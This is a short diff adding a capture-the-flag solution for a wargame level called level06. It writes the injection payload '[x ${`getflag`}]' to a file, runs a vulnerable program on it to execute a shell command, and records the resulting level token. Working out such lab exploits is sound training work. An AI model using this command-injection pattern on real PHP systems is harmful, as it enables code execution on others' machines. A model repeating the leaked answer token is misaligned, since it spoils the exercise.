@@ -1,0 +1,6 @@
+LEVEL06
+ls
+-> level06  level06.php
+echo '[x ${`getflag`}]' > /tmp/flag
+./level06 /tmp/flag
+-> token : wiok45aaoguiboiki2tuin6ub
